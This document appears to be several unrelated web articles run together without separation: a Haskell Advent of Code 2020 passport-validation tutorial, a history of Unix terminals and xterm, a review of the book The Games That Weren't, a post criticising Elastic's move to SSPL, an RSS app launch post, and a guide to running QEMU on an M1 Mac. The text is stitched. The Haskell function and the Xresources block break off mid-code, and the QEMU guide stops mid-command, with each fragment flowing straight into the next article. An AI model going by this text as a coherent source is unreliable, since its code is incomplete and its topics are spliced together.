<div data-language="haskell"><pre><code><span>requiredFields</span> <span>::</span> <span>[</span><span>PassportField</span><span>]</span>
<span>requiredFields</span> <span>=</span>
  <span>[</span> <span>BirthYear</span><span>,</span>
    <span>IssueYear</span><span>,</span>
    <span>ExpirationYear</span><span>,</span>
    <span>Height</span><span>,</span>
    <span>HairColor</span><span>,</span>
    <span>EyeColor</span><span>,</span>
    <span>PassportId</span>
  <span>]</span></code></pre></div>
<p>We can then define a validation function:</p>
<div data-language="haskell"><pre><code><span>isEntryValid</span> <span>::</span> <span>PassportEntry</span> <span>-&gt;</span> <span>Bool</span>
<span>isEntryValid</span> <span>entry</span> <span>=</span>
  <span>all</span> <span>(</span><span>`HM.member`</span> <span>entry</span><span>)</span> <span>requiredFields</span></code></pre></div>
<p>And change our main function to use that:</p>
<div data-language="haskell"><pre><code><span>main</span> <span>::</span> <span>IO</span> <span>(</span><span>)</span>
<span>main</span> <span>=</span> <span>do</span>
  <span>contents</span> <span>&lt;-</span> <span>readFile</span> <span>"input.txt"</span>
  <span>let</span> <span>entries</span> <span>=</span> <span>map</span> <span>parseEntry</span> <span>(</span><span>S.splitOn</span> <span>"\n\n"</span> <span>contents</span><span>)</span>
  <span>print</span> <span>$</span> <span>length</span> <span>$</span> <span>filter</span> <span>isEntryValid</span> <span>entries</span></code></pre></div>
<p>Running this yields <code>2</code>, which is the correct answer!
<a href="https://gist.github.com/Arkham/b749043e1622bf01c96eefe303df0b9b">Here</a> is
all the code we have written so far, if you’re feeling like you need a
refresher.</p>
<h2>Advent of Code 2020, Day 4, Part II</h2>
<p>In the second part of the challenge, these new rules are added:</p>
<div data-language="plain"><pre><code>- byr (Birth Year) - four digits; between 1920 and 2002.
- iyr (Issue Year) - four digits; between 2010 and 2020.
- eyr (Expiration Year) - four digits; between 2020 and 2030.
- hgt (Height) - a number followed by either cm or in:
  - If cm, the number must be between 150 and 193.
  - If in, the number must be between 59 and 76.
- hcl (Hair Color) - a '#' followed by six chars 0-9 or a-f.
- ecl (Eye Color) - one of: amb blu brn gry grn hzl oth.
- pid (Passport ID) - a nine-digit number.
- cid (Country ID) - ignored, missing or not.</code></pre></div>
<p>Here is a new batch for us to peruse:</p>
<div data-language="plain"><pre><code>pid:087499704 hgt:74in ecl:grn iyr:2012 eyr:2030 byr:1980
hcl:#623a2f

eyr:1972 cid:100
hcl:#18171d ecl:amb hgt:170 pid:186cm iyr:2018 byr:1926</code></pre></div>
<ul>
<li>the first passport is <em>valid</em></li>
<li>the second passport is <em>invalid</em> (look at the <code>eyr</code> field)</li>
</ul>
<p>These new requirements are a bit annoying. Our simple approach of checking
if all required fields are present won’t work any longer. We can instead
implement a <code>isFieldValid</code> function to check if all fields are valid.</p>
<div data-language="haskell"><pre><code><span>isFieldValid</span> <span>::</span> <span>(</span><span>PassportField</span><span>,</span> <span>String</span><span>)</span> <span>-&gt;</span> <span>Bool</span>
<span>isFieldValid</span> <span>(</span><span>field</span><span>,</span> <span>value</span><span>)</span> <span>=</span>

<p>The other day, as I was going through some of my old notes, I stumbled upon something I had written about the console, the terminal and the shell on Unix-like operating systems. I have decided to rewrite these notes in order to share them here on my website. So without further ado we will now stroll down memory lane and take a quick look at the origins of the Unix terminal and shell. And I will also give my advice to new users on Linux or BSD regarding the choice of terminal emulator and shell.</p>

<h2 id="the-terminal-and-the-console">The terminal and the console</h2>

<p>Early computers where huge machines that consisted of multiple cabinets, e.g. one cabinet for the CPU, one or more cabinets for tape drives, one cabinet for each disk drive, one cabinet for a punched card reader and one cabinet for a high speed printer. The image below is a Univac 9400 system from 1967 consisting of several cabinets.</p>

<p>The "console" was the "control console". In the pictures below is a "UNIVAC 1" control console and a "UNIVAC 2" control console.</p>

<p>The word terminal comes from the Latin "terminus", meaning "an end, a limit, boundary line", indicating that it's the terminating end or "terminal" end of a communications process. You will sometimes hear the description "a dumb terminal" when referring to a text-based environment where the computer is <i>just taking input and showing text</i> while the real work happens at the other end, typically in a <a href="https://en.wikipedia.org/wiki/Mainframe_computer">mainframe</a>.</p>

<p>The <a href="https://en.wikipedia.org/wiki/Teleprinter">teleprinter</a> or TTY was the first kind of terminal. Rather than a monitor you would have a literal typewriter in front of you. When you typed on it, you would see the text on a piece of paper and that text would be send to the computer. When the computer replied, you would see the typewriter print on the paper. Some models could also be used to create punched tape for data storage (either from typed input or from data received from a remote source) and to read back such tape for local printing or transmission.</p>

<p>In the picture below is a Teletype 33 ASR Teleprinter. It was introduced in 1963 as an electro-mechanical teleprinter and it was one of the most popular terminals in the communications industry. The ASR stands for <b>A</b>utomatic <b>S</b>end and <b>R</b>eceive. The ASR 33 had a built-in punched tape reader and tape punch which allowed the user to save programs.</p>

<p><img src="https://www.unixsheikh.com/includes/images/asr33.jpg" alt="33 ASR Teleprinter"><br><span>A Teletype Model 33 ASR teleprinter, usable as a terminal.</span></p>

<p><b>NOTE:</b><br>If you're interested I can highly recommend that you take a look at Charles Baetsen's Hobby Page as he has a wealth of information about the <a href="https://va3ngc.weebly.com/asr-33-documentation.html">Teletype 33 ASR</a> in the form of both user manuals, installations manuals and videos.</p>

<p>In the picture below Ken Thompson (sitting) and Dennis Ritchie (standing) is using a 33 ASR teleprinter connected to a <a href="https://en.wikipedia.org/wiki/PDP-11">PDP-11</a>, the picture is from 1972.</p>

<p>Later, as computers became much smaller, it was possible to integrate multiple components into one single unit, with both a video monitor and a keyboard put together inside it, and the "console" now became more or less synonymous to the "terminal". Both the "console" and the "terminal" now referred to the physical video terminal that had replaced both the teleprinter and the old control console.</p>

<p>The video terminal provides a way for the kernel and other processes to send text output on the monitor to the user, and to receive text input from the user via the keyboard.</p>

<p>The VT100 is a video terminal, introduced in August 1978 by Digital Equipment Corporation (DEC). It was one of the first terminals to support ANSI escape codes for cursor control and other tasks, and added a number of extended codes for special features like controlling the status lights on the keyboard. This led to rapid uptake of the ANSI standard, becoming the de facto standard for terminal emulators.</p>

<p><img src="https://www.unixsheikh.com/includes/images/dec-vt100.jpg" alt="DEC VT100"><br><span>A DEC VT100</span></p>

<p>The VT220 is an ANSI standard video terminal introduced by Digital Equipment Corporation (DEC) in November 1983. The VT240 added monochrome vector graphics support to the base model, while the VT241 did the same in color. The 200 series replaced the VT100 series. Among its major upgrades was a number of international character sets, as well as the ability to define new character sets, and a much lighter keyboard.</p>

<p>Today, in the software world, "console" and "terminal" has become completely synonymous.</p>

<h3 id="the-virtual-terminal">The virtual terminal</h3>

<p>A virtual terminal or virtual console is a program that simulates a physical terminal. For example, both the Linux kernel and BSD kernels support virtual terminals - terminals that are logically separate, but which access the same physical keyboard and monitor.</p>

<p>The virtual terminal gives the impression that several independent terminals are running concurrently. Each virtual terminal can be logged in with a different user and it can run its own shell and have its own font settings. The virtual terminals each use a device <code>/dev/ttyX</code>, and you can switch between them by pressing <code>Alt+FX</code> (where <code>X</code> is equal to the virtual terminal number, beginning with 1).</p>

<h2 id="the-terminal-emulator">The terminal emulator</h2>

<p>Emulation refers to the ability of a computer program to emulate, i.e. imitate, another program or device. A terminal emulator is a computer program that emulates a physical terminal within some other display architecture, such as the <a href="https://en.wikipedia.org/wiki/X_Window_System">X Window System</a>.</p>

<p>Many different terminal emulators have been developed that emulate terminals such as the <a href="https://en.wikipedia.org/wiki/VT52">VT52</a>, <a href="https://en.wikipedia.org/wiki/VT100">VT100</a>, <a href="https://en.wikipedia.org/wiki/VT220">VT220</a>, <a href="https://en.wikipedia.org/wiki/VT320">VT320</a>, <a href="https://en.wikipedia.org/wiki/IBM_3270">IBM 3270/8/9/E</a>, <a href="https://en.wikipedia.org/wiki/IBM_5250">IBM 5250</a>, and many others.</p>

<p>The terminal emulator takes the input you type at the keyboard and convert those to <a href="https://en.wikipedia.org/wiki/ASCII">ASCII</a> characters which it sends to the shell, or to a program running under the shell (more about the shell later). The terminal emulator also takes the stream of output characters from the various programs you run via the shell and displays them on the monitor.</p>

<p>The purpose of the terminal emulator is to allow access to the command line while working in a graphical user interface, such as the X Window System. Since the shell is "expecting" to interface with a human through a terminal, and we don't use a physical terminal while in a graphical environment, we need the terminal emulator.</p>

<p>You can see what terminal types are available on most Linux distributions by running <code>ls /lib/terminfo/*</code> (the path may be different on your system). On OpenBSD it's <code>ls /usr/share/terminfo/*</code></p>

<h4 id="xterm">xterm</h4>

<p><a href="https://invisible-island.net/xterm/xterm.html">xterm</a> was originally written as a stand-alone terminal emulator for the <a href="https://en.wikipedia.org/wiki/VAXstation#VAXstation_100">VAXStation 100 </a> (VS100) by Mark Vandevoorde, a student of <a href="https://en.wikipedia.org/wiki/Jim_Gettys">Jim Gettys</a>, who worked at <a href="https://en.wikipedia.org/wiki/Digital_Equipment_Corporation">DEC's</a> Cambridge Research Laboratory. It became clear that xterm would be more useful as part of X Window System than as a standalone program, so it was retargeted to the X Window System.</p>

<p>The xterm program is the default terminal emulator for the X Window System. It provides DEC VT102/VT220 features and other selected features from higher-level terminals such as VT320, VT420 and VT520. It also provides Tektronix 4014 emulation for programs that cannot use the window system directly. If the underlying operating system supports terminal resizing (for example, the SIGWINCH signal in systems derived from 4.3bsd), xterm will use the facilities to notify programs running in the window whenever it is resized.</p>

<p>Around 1996 the main line of development shifted to the <a href="https://en.wikipedia.org/wiki/XFree86">XFree86</a> implementation of the X Window System and xterm is now maintained by Thomas Dickey, who is also the current lead developer of <a href="https://en.wikipedia.org/wiki/Lynx_%28web_browser%29">Lynx</a>, a popular customizable text-based web browser.</p>

<p>Early versions of xterm emulated the VT102 and Tektronix 4014. Later versions added control sequences for DEC and other terminals such as:</p>
<ul>
    <li>VT220: Added in patch 24.</li>
    <li>VT320: Added in patch 24.</li>
    <li>VT420: DECSTR (soft terminal reset) was added in patch 34.</li>
    <li>VT520: Although not officially emulated, parts of VT520 features were implemented. Controls DECSMBV and DECSWBV for setting the margin- and warning-bell volume was added in patch 254.</li>
</ul>

<p>As with most X applications, xterm can be customized via global X resources files (e.g. <code>/usr/lib/X11/app-defaults/XTerm</code>), per-user resource files (e.g. <code>~/.Xresources</code>), or command-line arguments. Most of the command-line options correspond to resource settings, as noted in the <a href="https://man.archlinux.org/man/extra/xterm/xterm.1.en">xterm manual page</a>.</p>

<p>While the name of the program is xterm, the X resource class in <code>~/.Xresources</code> is <code>XTerm</code>, e.g.:</p>

<pre>XTerm*utf8: 1</pre>

<p>The <a href="https://man.archlinux.org/man/extra/xterm/xterm.1.en">xterm manual page</a> provides a full list of features and options.</p>

<p>xterm is still being actively developed, it works really great across many different systems, it has extremely low input latency, it has many hidden gems and it is my favorite terminal emulator! For that reason I'm going to share some settings you can use in your <code>~/.Xresources</code> file:</p>

<pre>XTerm*faceName: "DejaVu Sans Mono"
XTerm*faceSize: 12
XTerm*renderFont: true

XTerm*faceSize5: 20
XTerm*faceSize6: 22
XTerm*utf8: 1
XTerm*termName: xterm-256color
XTerm*borderWidth: 0
XTerm*autohint: true
XTerm*backarrowKey: false

<p>Towards the end of of 1985, adverts started appearing in my Computer &amp; Video Games magazines for “the first ever computer cartoon” – Scooby Doo in the Castle Mystery! And to a massive Scooby Doo fan like me, it was incredible! They were clearly Spectrum screenshots on there, but they definitely looked like nothing else, except maybe what a Spectrum port of something like Dragon’s Lair might look like… which, the following year, we’d find out was more or less the case!</p>

<p>Anyway, as 1985 became 1986, previews started appearing that hinted at an interactive story involving a spooky Scottish castle belonging to Shaggy’s aunt, presented as cartoon action sequences that you directed to solve the mystery. And yes, it really was like a laser-disc game crammed into a 48K Spectrum! As the months passed, the big double-page, full colour adverts kept coming, but no sign of any game, then in March 1986, in an Elite preview exclusive, C&amp;VG said “despite what you’ve read in other magazines, Elite still plans to release its computer cartoon adventure, Scooby Doo in the Castle Mystery for the 48K Spectrum,” but towards the end of the article also says that it won’t be in the “heavily advertised” form because there wasn’t enough memory left to make it playable! And, of course, what we eventually got at the end of 1986 was the fantastic, but utterly brutal Scooby Doo, an arcade-platformer take on Kung-Fu Master, with some of my favourite graphics ever on the Spectrum! </p>

<p>As much as I love what we finally got, I still look at the original advert and wonder what could have been… And I would have gotten away with it too, if it weren’t for you meddling 48K of memory! If only Sir Clive had come up with 128K a bit sooner it might all be different, but that’s the tale of my very first encounter with a game that weren’t. Wasn’t!</p>



<p>Fast forward to Christmas 2021, and I received a wonderful new book called The Games That Weren’t, written by Frank Gasking and published by my favourite retro-gaming book peddlars Bitmap Books, who are responsible for all kinds of equally wonderful stuff on my bulging bookshelves, but nothing that bulges quite as much as this 644-page hardback behemoth!</p>

<p>As someone that writes about games from time to time, I think I’m qualified to say that everything about this puts me to shame! The first thing you notice, the very first time you flick through it, is that it’s clearly an absolute labour of love, much like Frank’s website of the same name that he started way back in the nineties to document and find lost and unreleased games across many platforms. The next thing you notice is that it’s visually stunning – even more so than Scooby Doo in the Castle Mystery! And then you realise that it’s so much more than that…</p>

<p>As games industry legend David Crane tells us in the foreword, this is all about games that never quite reached the game-playing public. Going all the way back to 1975 and up to 2015, the book covers 80 games that weren’t, and they weren’t for myriad reasons that all get unravelled here – flawed game design, internal politics, over-ambition, poor hardware sales, high cartridge costs or cabinet costs, failed field tests, expired licenses, not being able to fit a computer cartoon into 48K… Actually, I should say that Scooby Doo in the Castle Mystery didn’t make the cut here (which gives me hope that it still might arrive one day!), but some of the tales around these unreleased games are definitely mysteries worthy of Scooby and the gang!</p>

<p>Having spent some time in my stack of old game magazines just get my head around enough of the Scooby Doo story to mention it here, I can really empathise with Frank’s decades-long obsession with investigating these mysteries – that 30 minutes putting together a timeline from first advert to previews, doubts, cancellations then something else emerging in its place was really fascinating! But where I’ve just included a picture of an old copy of C&amp;VG, every game covered in The Games That Weren’t includes a load of development assets, screenshots, photos and artistic impressions – all reproduced in the very highest quality and sometimes for the first time – to illustrate the wonderfully in-depth analysis on each game.</p>

<p>Before we analyse that analysis, let’s quickly mention a few of those games to give us a bit of context, as well as what is probably my favourite thing about the book, which is not only discovering stuff you didn’t know existed, but discovering stuff you would have actually bought, and even seeing screenshots of it! And that’s why we’ll start with Elite on the Nintendo Game Boy, which got to prototype stage then the deal with Ocean fell through and consigned it to history; another nice feature is that for each game it tells you if it’s available to play or not… And apparently this one is, so definitely expect more from me on that in the future! We all know about Elite, but there’s an awful lot more that you probably won’t know anything about, such as Death Pit, Dick Special, Eye of the Moon, Virtua Hamster(!), Spitfire Fury  and Starring Charlie Chaplin to name but a few. There’s unreleased sequels like Heart of Yesod, Star Fox 2 and, er, Gazza 2. There’s all kinds of film licenses that (possibly thankfully) never saw the light of day like The Terminator, Lethal Weapon and Waterworld, as well as other licenses like Daffy Duck and Tony Hawk’s Shred Session. And then there’s the versions of games you probably do know but never made it, like Rescue on Fractalus! or Bubble Bobble, Ridge Racer or The Last Ninja…</p>

<p>As I write this, the last game I played before I went to bed last night was Arcade Archives Frogger on Nintendo Switch, so I reckon that Frogger 2: Swampy’s Revenge on Nintendo 64 is the perfect place to talk about the actual meat of the game analysis you’re getting here! It starts with a title screen summarising the reason it weren’t – cartridge costs in this case – then the year it weren’t (2000), the developer, the platform and whether or not it’s available to play. Then we get some background history – why Frogger epitomises 1980s arcades, the aim of the game, its reception and its ports. Then we get into what happened next; in the case of Frogger, it obviously never stopped being released on different platforms, but there was a Hasbro remake developed by Millenium Interactive in 1997 that leads us directly into the non-sequel. When Hasbro wanted a sequel, Millenium weren’t available to do it, so they approached Interactive Studios. We then hear from Philip Oliver, and then the project’s technical manager, Matt Cloy, who talks about the team and how they set about developing the game for the Nintendo 64. We get right into the development kits and all the juicy technical details here, right from the horse’s mouth, as well as some great detail on the process of developing then moving on from the earliest designs. </p>



<p>This turned into very much a 3D game, in stark contrast to the overhead 2D original, with complex geometries and some wild-sounding environments that weren’t too far removed from Super Mario Galaxy, years ahead of its time. But Hasbro didn’t like it! Need something more traditional, more 2D, more like Frogger. So then we hear about how it was all stripped back, the action became more immediate to the player, and a story was introduced involving Swampy the Crocodile being jealous of Frogger’s fame and fortune! At this point we start getting some really nice detail about how the game actually played as levels took shape and started to be tested and tweaked, and then there’s some substitutions made in the team to bring on some experience and make sure the game was brought home as planned. </p>

<p>And then it was all brought down with a bang! Hasbro got cold feet on increasing cartridge production costs and lead times, and the prospect of any profit was becoming risky, so at 70% complete, the Nintendo 64 version was canned. Now we jump to the PlayStation, PC, Dreamcast and Game Boy Colour versions that did eventually make it into the wild, reviewed okay, but never really had a chance to sell properly because after a year Konami said they wanted it removed from sale because the licence had expired! Now we get into the fun part of years then passing, glitchy prototypes sneaking out into the hands of collectors, and later builds appearing that featured things like placeholder sounds from other games and Pac-Man styled frogspawn collecting that would never have made the final cut. Finally, we get to what happened next, where we are now with availability of the various unfinished states online, and how the developers feel about the project in retrospect. And as we’ve already discussed, all those written words are supported by some beautiful visuals, in this case a full-page unpublished advert for the game including the Nintendo 64 logo at the top, and a selection of half-page, well-curated (and well-defined) screenshots that serve perfectly well to bring the game to life. It really is an incredibly polished package, and that’s all for just one of the eighty games!</p>



<p>Now, not every game gets the thousands of words of research and interviews that Frogger 2 gets – though an awful lot of them do – but regardless, you can see the care, attention and passion that’s gone into every single feature on every single game. And all of this this is complemented by five purpose-built “Hardware That Wasn’t” blueprint features and a load of interviews with the likes of the aforementioned David Crane, Jeff Minter, the Oliver Twins, Matthew Smith, Geoff Crammond and many other industry big-hitters, plus an honourable mentions section on loads of other games, all in chronological order, that you can find out more about digitally.</p>

      <section itemprop="text">
        
        <p>In a play to convert users of their open source projects into paying customers, today Elastic announced that they are <a href="https://www.elastic.co/blog/licensing-change">changing the license</a> of both Elasticsearch and Kibana from the open source Apache v2 license to <a href="https://www.mongodb.com/licensing/server-side-public-license">Server Side Public License</a> (SSPL). If your organisation uses the open source versions of either Elasticsearch or Kibana in its products or projects, it is now at risk of being forced to release its intellectual property under terms dictated by another.</p>

<p>If you’re not yet aware of the SSPL, you can catch up <a href="https://mjg59.dreamwidth.org/51230.html">here</a>. As licenses go, it’s pretty problematic from a business perspective. Every <a href="https://en.wikipedia.org/wiki/Intellectual_property">IP lawyer</a> to whom I’ve showed the text of the SSPL has been rather alarmed before they even reach the end of it. Basically, it’s a hostile proprietary license masquerading in open source clothing. By using an SSPL project in your code, you are agreeing that if you provide an online service using that code then you will release not only that code but also the code for every supporting piece of software, all under the SSPL. It’s not a stretch to interpret the wording of the license as requiring users of the SSPL’d software therefore to release the code for everything straight down to the bare metal. There are those who will point to <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">the FAQ</a> for the SSPL and claim that the license isn’t interpreted in that way because the FAQ says so. Unfortunately, when you agree to a license you are agreeing to the <em>text of that license document</em> and not to a FAQ. If the text of that license document is ambiguous, then so are your rights and responsibilities under that license. Should your compliance to that license come before a judge, it’s <em>their</em> interpretation of those rights and responsibilities that will hold sway. This ambiguity puts your organisation at risk.</p>

<p>In <a href="https://www.elastic.co/blog/licensing-change">its announcement</a>, Elastic claims that this is simply a change of open source license. In one way they’re correct: they’re changing the license away from the open source Apache v2 license. However they are changing to what can best be described as a proprietary source available license, <em>not</em> to an open source one. MongoDB, the originators of SSPL, requested that <a href="https://opensource.org/">Open Source Initiative</a> (OSI) (the standards body that maintains the <a href="https://opensource.org/osd-annotated">Open Source Definition</a> and certifies licenses as open source) certify the SSPL as such. After a great deal of discussion among the panel of legal, licensing, and open source experts, MongoDB withdrew the SSPL from consideration as an open source license, as it appeared highly unlikely it would be certified as open source. That SSPL is not an open source license is no longer in dispute. That ship has sailed. If you have a problem with this, I suggest you <a href="https://lists.opensource.org/pipermail/license-discuss_lists.opensource.org/2019-May/020483.html">take it up</a> with OSI. As for Elastic’s public and verifiably false claim that SSPL is an open source license, it’s my hope that OSI will have a conversation with them and make a public statement of their own shortly.</p>

<p>No, this is a business decision, not an ideological one. Elastic made a business decision to change to this hostile proprietary license to give them a way to <del>extort</del>influence users to become customers. Without a great deal more strategic information about Elastic’s business and operations none of us are qualified to judge whether it’s the correct decision, but the decision itself is valid. They are allowed to make this sort of strategic move for their company.</p>

<p>However, you and your organisation have now also been forced into a business decision. If your organisation uses the Apache v2 licensed Elasticsearch or Kibana in its projects or products, it must now assume that it is at risk one way or another. It can upgrade to version 7.11 of these projects, thereby accepting the terms of SSPL and potentially also being required to release the code for its entire stack (a great deal of which it will not have the copyright over and will be unable to release, thereby potentially being in violation of SSPL). It can remain on version 7.10, but then it will no longer receive future updates, including important security fixes, thereby taking on another sort of risk. It could choose to pay for a Gold+ license for the software, but it’s unlikely that the budget is prepared for this sort of unexpected expense. And finally it can rearchitect its project or product, replacing Elasticsearch and/or Kibana with alternatives. Frankly, considering today’s unfriendly move by Elastic, putting some space between it and your organisation may be the safest alternative in the long run, but it will come with its own considerable price tag in time and other potential opportunity and switching costs.</p>

<p>The one thing your organisation cannot afford to do is ignore this. It’s time to call a meeting with your legal, software development, product, finance, and strategy teams to start to figure out the best option for you.</p>

January 13, 2021</time> - <span title="Estimated read time"> 4 mins </span> </span></p> <p><strong>Today is the day!</strong> It’s been a long time coming. I originally started working on and released the initial beta version of <strong>An Otter RSS</strong> in August of 2020. After five months, I’m finally releasing it to the public!</p> <p><strong>Happy launch day, An Otter RSS</strong> 🥳</p> <p><a href="https://apps.apple.com/us/app/an-otter-rss-reader/id1529696614" target="_blank"> <img src="https://www.joshholtz.com/images/Download_on_App_Store.svg"> </a></p> <hr>  <p>I was developing another app in July of 2020. This app was my first app built completely in SwiftUI. I was ending reading a lot of Swift and SwiftUI blogs since I didn’t really know what I was doing at the time. I realized I wanted to keep up with all the blogs I was finding. I’ve never been a big RSS reader but this seemed like the time to get into it. I wasn’t going to be a power user so I wasn’t looking to pay for anything that required a subscription. But I <em>did</em> want my feeds to sync between my iPhone, iPad, and Mac. It turns out (at that time) I couldn’t find one that I liked.</p> <p><strong>So I decided to make my own 😜</strong></p> <p>I made a quick and dirty prototype that shared a list of feeds and articles in about five hours.</p> <p>I shared my progress on Twitter and I had a lot of people seem interested in it. I decided to keep going on this RSS reader and shared it on&nbsp;<a href="https://airport.community/">https://airport.community</a> and got a lot more passionate testers than I expected 🥳</p> <p>I let this app sit for a while because&nbsp;I was happy with it. It is what I wanted and nothing more. I was also building <a href="https://connectkit.app/">ConnectKit</a> at the time. I got consumed by the Shortcuts and the App Store Connect API. I was still using <strong>An Otter RSS</strong> every day though! I just didn’t know what I wanted to do with it yet.</p> <p>Fast forward to a few weeks ago and my beta app expired 😫 My users wanted it back and I wanted it back for them. I didn’t want to keep making new betas to fight the expiriation so the App Store seemed like the right path to go.</p> <p>I had a weird amount of “free time” since I’m currently on family leave (me and my wife just had our first child). I decided I would take the time in between feedings, cryings, and sleeps (which isn’t much) to prep it for the App Store.</p> <p>So I did and here we are. It’s launch day!</p> <hr> <h2 id="why-is-it-free"><em>Why is it free?</em></h2> <p>I made this app for me! I made it as a learning experience and for something I would personally use. I don’t want the pressure of having a paid app to make it what users want 🤷‍♂️ But I do care what users thinking and what so I will take feature requests and bug reports seriously 😉</p> <p>There <strong>is</strong> an in-app payment for <strong>tipping the developer</strong> <em>if</em> users want to do so. The in-app payment gets the user my eternal love, alternative app icons, and some new app color themes (coming in a future version). It’s not much and not functionality that is needed for the app. But I did want the app to be free with all the RSS features!</p> <hr>  <p><strong>An Otter RSS</strong> doesn’t do much but it does everything I want it to. My goals were:</p> <ul> <li>Subscribe to RSS feeds (sync over iCloud)</li> <li>List new articles for each feed (sync over iCloud)</li> <li>Show read/unread status of articles (sync over iCloud)</li> <li>Support for iOS, iPadOS, and macOS</li> <li>Background refreshing with local notifications</li> </ul> <p>Things I didn’t want:</p> <ul> <li>Fancy reading styles (viewing in webview was perfectly fine)</li> </ul> <p><strong>That was it 😁</strong> I wanted just an okay looking RSS reader with minimal functionality. And that is exactly what <strong>An Otter RSS</strong> is still today! There are plenty of more powerful RSS apps out there if people want something more. That’s totally fine with me! I get it 🙃</p> <p>I also ended up adding a bit more along the way!</p> <ul> <li>Import/export with OPML <ul> <li>Bring your existing feeds in</li> <li>Take them with you if you don’t like it</li> </ul> </li> <li>Widgets</li> <li>Shortcuts</li> </ul> <p><img width="300" src="https://www.joshholtz.com/images/2021-01-13/screenshot-feeds.png"> </p> <p><img width="300" src="https://www.joshholtz.com/images/2021-01-13/screenshot-articles.png"> </p> <p><img width="300" src="https://www.joshholtz.com/images/2021-01-13/screenshot-article.png"> </p> <p><img width="300" src="https://www.joshholtz.com/images/2021-01-13/screenshot-widgets.png"> </p> <hr> <h2 id="an-otter-rsss-future-and-beyond">An Otter RSS’s Future and Beyond</h2> <p>I’m not exactly sure what is in store for <strong>An Otter RSS</strong>’s future yet! I know I plan to keep up with maintenance and support 😇 I want to add a few more widget types (since widgets are really fun to make). At some point I would also like to improve the UI. It’s okay and it works for what I want but I think it would be a fun personal challenge to really polish the app up.</p> <p>Feel free to tweet me (<a href="https://twitter.com/joshdholtz">@joshdholtz</a>) or <a href="https://twitter.com/AnOtterRSS">@AnOtterRSS</a> with any feedback, issues, or feature request🥳</p> <p><a href="https://apps.apple.com/us/app/an-otter-rss-reader/id1529696614" target="_blank"> <img src="https://www.joshholtz.com/images/Download_on_App_Store.svg"> </a></p>     </div> </div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>  <div itemprop="articleBody"> <section> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-macos9.png" alt="Mac OS 9 in QEMU"></p> <p>QEMU is an open-source emulator for virtualizing computers. Unlike VMWare, it's able to both virtualize CPUs and emulate various CPU instruction sets. It's pretty powerful, free, and has a macOS port. There are alternate versions and different ways to install it. Still, in this example, I'm using <a href="https://brew.sh/">Homebrew</a>, a package manager for macOS/OSX that allows you to install software via the CLI and manage easily. </p> <p>Now, this post wouldn't be very exciting if I tried this on my Mac Pro, but I decided to try it on my MacBook M1. Thus far, the community has succeeded in getting QEMU to install the ARM version Windows, so I decided to do the more silly path and get PPC and X86 working on Apple Silicon. I encountered very little resistance, which surprised me as I haven't seen/read anyone trying this route. It's surprsingly very usable but the usefulness is going to be limited. I was able to play Sim City 2000 on Mac OS 9.2 at a fairly high resolution. For the sake of brevity, I'm going to skip over installing Homebrew on an Apple M1, but you'll want to use the arch -x86_64 method, which requires prepending. I've gotten OS 10.0 and nearly gotten Windows 10 working on my M1.</p> <p> <iframe width="560" height="315" src="https://www.youtube.com/embed/aeSx4pm4MwY" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe> </p>  <p>Included below is the instruction for both Apple Silicon and Intel Macs.</p> <hr> <br> <h3>Requirements</h3> <ul> <li>Basic understanding of the terminal in OS X/macOS</li> <li>Apple Silicon (M1) computer (or Intel) Mac</li> <li>Xcode</li> <li>xcode-select (CLI Tools) <code>xcode-select --install</code></li> <li>Homebrew</li> </ul> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-osx.jpg" alt="Mac OS X in QEMU"></p> <h3>Step 1: Install QEMU</h3> <p>This is the only step where Apple Silicon and Intel Macs differ. You'll need to install the x86 version of QEMU for the Apple silicon macs first.</p> <h4>Apple Silicon</h4> <figure><pre><code data-lang="bash">    <span>arch</span> <span>-x86_64</span> brew <span>install </span>qemu </code></pre></figure> <h4>x86 Intel Macs</h4> <figure><pre><code data-lang="bash">    brew <span>install </span>qemu </code></pre></figure> <h3>Step 2: Create a disk image</h3> <p>The rest of the steps do not need any specification for M1 vs. Intel.</p> <p>You can specify a route, but I just used the default pathing, the 2G = 2 GB below. You can get away with much less for OS X OS 9. If you'd like more space, change the size of the simulated HDD. .</p> <figure><pre><code data-lang="bash">    qemu-img create <span>-f</span> qcow2 myimage.img 2G </code></pre></figure> <h3>Step 3: Launching the emulated computer and the tricky part: Formatting the HDD</h3> <p>Now that we have a blank hard disk image, we're ready to go.</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> d <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk/image  </code></pre></figure> <p>Let's break this down so it's not just magic. The first command is the qemu core emulator, you can use things like 64-bit x86 CPU <code>qemu-system-x86_64 </code> or a 32-bit CPU <code>qemu-system-i386 </code>, but we're using a PPC, so we are using <code>qemu-system-ppc</code>. </p> <p>Next, we're declaring PC bios with <code>-L pc-bios</code>, I'm unsure if this is necessary. This seems to be the default even in Mac QEMU. After that, the <code>-boot</code> flag declares the boot drive. For those who remember the days of yore, C is the default drive for PCs, D is the default for the CD-Rom like a PC. It's weird, I know. <code>-M</code> is the model flag. It's pretty esoteric, but <a href="http://people.redhat.com/pbonzini/qemu-test-doc/_build/html/topics/PowerPC-System-emulator.html">QEMU uses OpenBIOS</a>, and mac99 is the model for Beige G3s. The lowercase <code>-m</code> is memory, expressed in megabytes, but you can use 1G or 2G for 1 or 2 gigabytes like the format utility. <code>-hda</code> is the image we're using. Finally, <code>-cdrom</code> is the installer image</p> <h3>Step 3.5: Special considerations between operating systems</h3> <p>I discovered that OS X 10.0's installer has a significant flaw: It doesn't have a disk utility. The disk images are black disks thus have no file system. If you want to run OS X 10.0, you'll need to first launch an installer that can format HFS like OS 9 or later versions of OS X, run the disk utility, format the image and then exit out of the emulator. The process would look like this:</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> d <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk/macosx10.4 or macOS9  </code></pre></figure> <p>Then format the drive from the utility, quit the emulator (control-c on the terminal window).</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> d <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> 